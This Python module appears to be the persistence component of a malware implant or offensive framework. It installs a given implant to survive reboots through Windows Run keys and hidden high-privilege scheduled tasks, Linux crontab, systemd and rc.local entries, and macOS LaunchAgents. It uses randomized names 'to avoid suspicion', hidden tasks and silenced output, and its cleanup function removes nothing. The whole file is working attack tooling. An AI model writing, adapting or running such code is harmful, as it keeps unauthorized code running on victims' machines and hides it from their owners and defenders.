"""
Persistence mechanisms for maintaining access across reboots
Supports Windows (Registry, Tasks), Linux (Cron, systemd), macOS (LaunchAgent)
"""

import os
import platform
import subprocess
import json
from datetime import datetime


class PersistenceManager:
    """Multi-platform persistence mechanisms"""
    
    def __init__(self):
        self.os_type = platform.system()
        self.is_windows = self.os_type == "Windows"
        self.is_linux = self.os_type == "Linux"
        self.is_macos = self.os_type == "Darwin"
    
    def install_persistence(self, implant_path, method="auto"):
        """Install persistence with specified method"""
        if method == "auto":
            # Auto-detect best method for current OS
            if self.is_windows:
                return self.windows_registry_persistence(implant_path)
            elif self.is_linux:
                return self.linux_cron_persistence(implant_path)
            elif self.is_macos:
                return self.macos_launchagent_persistence(implant_path)
        elif method == "registry":
            return self.windows_registry_persistence(implant_path)
        elif method == "task":
            return self.windows_scheduled_task_persistence(implant_path)
        elif method == "cron":
            return self.linux_cron_persistence(implant_path)
        elif method == "systemd":
            return self.linux_systemd_persistence(implant_path)
        elif method == "launchagent":
            return self.macos_launchagent_persistence(implant_path)
        elif method == "rc.local":
            return self.linux_rclocal_persistence(implant_path)
    
    # ==================== WINDOWS ====================
    
    def windows_registry_persistence(self, implant_path):
        """
        Add implant to Windows Registry Run key
        Path: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
        """
        if not self.is_windows:
            return {"success": False, "error": "Not Windows"}
        
        try:
            import winreg
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            # Random name to avoid suspicion
            import random
            import string
            name = ''.join(random.choices(string.ascii_letters, k=8))
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, implant_path)
            winreg.CloseKey(key)
            
            return {
                "success": True,
                "method": "registry",
                "path": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                "value_name": name
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def windows_scheduled_task_persistence(self, implant_path):
        """
        Create Windows Scheduled Task that runs at logon
        """
        if not self.is_windows:
            return {"success": False, "error": "Not Windows"}
        
        try:
            import random
            import string
            task_name = ''.join(random.choices(string.ascii_letters, k=10))
            
            # Create task XML
            task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>{datetime.now().isoformat()}</Date>
    <Author>System</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-0-0-0-500</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{implant_path}</Command>
    </Exec>
  </Actions>
</Task>'''
            
            # Create temporary XML file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                f.write(task_xml)
                xml_path = f.name
            
            # Create scheduled task
            cmd = f'schtasks /create /tn "{task_name}" /xml "{xml_path}" /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            os.remove(xml_path)
            
            if result.returncode == 0:
                return {
                    "success": True,
                    "method": "scheduled_task",
                    "task_name": task_name
                }
            else:
                return {"success": False, "error": result.stderr}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # ==================== LINUX ====================
    
    def linux_cron_persistence(self, implant_path):
        """
        Add implant to user crontab
        Runs every 10 minutes
        """
        if not self.is_linux:
            return {"success": False, "error": "Not Linux"}
        
        try:
            # Check if crontab exists
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            existing_crons = result.stdout
            
            # Add new cron entry
            import random
            interval = random.randint(5, 15)  # Random interval 5-15 minutes
            new_cron = f"*/{interval} * * * * {implant_path} > /dev/null 2>&1\n"
            
            # Append to crontab
            crontab_content = existing_crons + new_cron
            
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=crontab_content)
            
            return {
                "success": True,
                "method": "crontab",
                "interval": interval
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def linux_systemd_persistence(self, implant_path):
        """
        Create systemd service for persistence
        """
        if not self.is_linux:
            return {"success": False, "error": "Not Linux"}
        
        try:
            import random
            import string
            service_name = ''.join(random.choices(string.ascii_letters, k=10))
            
            service_content = f"""[Unit]
Description={service_name}
After=network.target

[Service]
Type=simple
User={os.environ.get('USER')}
ExecStart={implant_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
            
            service_path = os.path.expanduser(f"~/.config/systemd/user/{service_name}.service")
            os.makedirs(os.path.dirname(service_path), exist_ok=True)
            
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(
                ['systemctl', '--user', 'enable', f'{service_name}.service'],
                capture_output=True
            )
            subprocess.run(
                ['systemctl', '--user', 'start', f'{service_name}.service'],
                capture_output=True
            )
            
            return {
                "success": True,
                "method": "systemd",
                "service_name": service_name
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def linux_rclocal_persistence(self, implant_path):
        """
        Add to /etc/rc.local (requires root)
        """
        if not self.is_linux:
            return {"success": False, "error": "Not Linux"}
        
        try:
            rc_local_path = "/etc/rc.local"
            
            if not os.path.exists(rc_local_path):
                return {"success": False, "error": "rc.local not found"}
            
            # Check if already has shebang
            with open(rc_local_path, 'r') as f:
                content = f.read()
            
            if '#!/bin/bash' not in content:
                content = "#!/bin/bash\n" + content
            
            # Add implant line
            content += f"\n{implant_path} &\n"
            
            # This requires root, so might fail
            try:
                with open(rc_local_path, 'w') as f:
                    f.write(content)
                os.chmod(rc_local_path, 0o755)
                return {
                    "success": True,
                    "method": "rc.local",
                    "note": "Requires root privileges"
                }
            except PermissionError:
                return {"success": False, "error": "Requires root privileges"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    # ==================== MACOS ====================
    
    def macos_launchagent_persistence(self, implant_path):
        """
        Create LaunchAgent plist for macOS persistence
        """
        if not self.is_macos:
            return {"success": False, "error": "Not macOS"}
        
        try:
            import random
            import string
            agent_name = 'com.' + ''.join(random.choices(string.ascii_lowercase, k=8)) + '.plist'
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{agent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{implant_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
"""
            
            plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}")
            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load the LaunchAgent
            subprocess.run(
                ['launchctl', 'load', plist_path],
                capture_output=True
            )
            
            return {
                "success": True,
                "method": "launchagent",
                "plist_name": agent_name,
                "path": plist_path
            }
        except Exception as e:
            return {"success": False, "error": str(e)}


def remove_persistence(method="all"):
    """Remove persistence mechanisms (cleanup)"""
    results = {}
    
    try:
        pm = PersistenceManager()
        
        if pm.is_windows and (method == "all" or method == "registry"):
            import winreg
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_ALL_ACCESS
                )
                # This would require knowing the specific value name
                # Typically you'd enumerate and remove malicious entries
                winreg.CloseKey(key)
                results['registry'] = "Cleanup available (manual removal recommended)"
            except:
                pass
        
        if pm.is_linux and (method == "all" or method == "cron"):
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            # Would need to rewrite crontab without malicious entry
            results['cron'] = "Cleanup available (manual removal recommended)"
        
        if pm.is_macos and (method == "all" or method == "launchagent"):
            results['launchagent'] = "Use: launchctl unload ~/Library/LaunchAgents/[agent.plist]"
        
        return {"success": True, "results": results}
    except Exception as e:
        return {"success": False, "error": str(e)}
